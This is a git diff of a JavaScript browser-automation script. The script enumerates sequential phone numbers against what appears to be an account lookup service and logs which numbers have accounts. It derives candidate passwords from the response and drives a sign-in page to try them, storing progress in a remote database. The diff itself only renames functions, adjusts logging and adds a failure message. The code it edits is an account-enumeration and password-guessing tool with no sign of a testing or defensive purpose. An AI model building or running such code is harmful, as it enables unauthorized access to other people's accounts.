@@ -91,7 +91,11 @@ async function browserStart() {
                     number = start * mMultiPol
                 }
                 if(number != 0) {
-                    checkNumber(number, runing, start, 0)
+                    if(key == 'start_1') {
+                        checkNumber(number, runing, start, 0)
+                    } else if(key == 'start_2') {
+                        checkNumber(number, runing, start, 0)
+                    }
                 }
             }
         }
@@ -103,8 +107,8 @@ async function browserStart() {
 function checkNumber(number, name, start, runing) {
     runing++
     let temp = runing
-    console.log('Check: '+number)
     if(temp >= 10) {
+        console.log('Check: '+number)
         database.set('/code/server/'+SERVER+'/'+name, number)
         temp = 0
     }
@@ -124,7 +128,7 @@ function checkNumber(number, name, start, runing) {
                 let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                 if(data[0][1] == 16) {
                     console.log('Found: '+data[0][4])
-                    logInNumber01(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
+                    logInNumber(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
                 } else {
                     checkNumber(number+1, name, start, temp)
                 }
@@ -136,7 +140,7 @@ function checkNumber(number, name, start, runing) {
 }
 
 
-async function logInNumber01(number, password, name, start, runing) {
+async function logInNumber(number, password, name, start, runing) {
     if(!mReloadPage) {
         let Identifier = await getIdentifierData(CODE+number)
         let bodyData = getNumberData(CODE+number, Identifier)
@@ -187,7 +191,7 @@ async function logInNumber01(number, password, name, start, runing) {
                                 mReloadPage = true
                                 await page.goto(signIn)
                                 mReloadPage = false
-                                logInNumber01(number, password, name, start, runing)
+                                logInNumber(number, password, name, start, runing)
                             })()
                         }
                     }
@@ -201,7 +205,7 @@ async function logInNumber01(number, password, name, start, runing) {
         })
     } else {
         setTimeout(function () {
-            logInNumber01(number, password, name, start, runing)
+            logInNumber(number, password, name, start, runing)
         }, 1000)
     }
 }
@@ -232,13 +236,14 @@ function passwordTry(password, TL, Identifier, type, sendCookies, again, loop, n
                 let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                 if(data[0][3] == 5) {
                     if(password.length > 8) {
-                        console.log('Wrong Password')
                         if(loop == 0) {
                             output = 1
                             passwordTry(password, TL, Identifier, type, null, 0, 1, number, name, start, runing)
                         } else if(loop == 1) {
                             output = 1
                             passwordTry(password, TL, Identifier, type, null, 0, 2, number, name, start, runing)
+                        } else if(loop == 2) {
+                            console.log('Password Matching Faild')
                         }
                     }
                 } else if(data[0][3] == 3) {
